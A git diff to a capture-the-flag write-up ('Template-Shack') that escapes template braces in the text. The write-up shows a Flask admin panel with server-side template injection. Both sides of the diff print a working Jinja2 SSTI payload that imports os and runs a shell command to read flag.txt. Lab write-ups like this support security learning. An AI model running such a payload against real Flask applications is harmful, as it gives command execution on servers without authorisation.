@@ -56,13 +56,13 @@ Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.Y
 Upgrade-Insecure-Requests: 1
 ```
 
-* The /admin request gets us to a complicated looking admin panel where most of the buttons don't work but clicking on the charts or tables shows us a custom 404 Page. This can often lead to SSTI in Flask Web Applications and we can test this by sending /admin/{{2+2}}
+* The /admin request gets us to a complicated looking admin panel where most of the buttons don't work but clicking on the charts or tables shows us a custom 404 Page. This can often lead to SSTI in Flask Web Applications and we can test this by sending /admin/\{\{2+2\}\}
 
 > Pro Security tip: Don't reinvent the wheel. xD
 
 ![alt-text]({{site.baseurl}}/assets/Template-Shack/404.png)
 
-* Using `/admin/{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}` payload, we are able to read the flag.txt file which was present in the current directory. You can read more about Jinga SSTI [here](https://www.onsecurity.co.uk/blog/server-side-template-injection-with-jinja2)
+* Using `/admin/\{\{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()\}\}` payload, we are able to read the flag.txt file which was present in the current directory. You can read more about Jinga SSTI [here](https://www.onsecurity.co.uk/blog/server-side-template-injection-with-jinja2)
 
 ## Flag
 ```
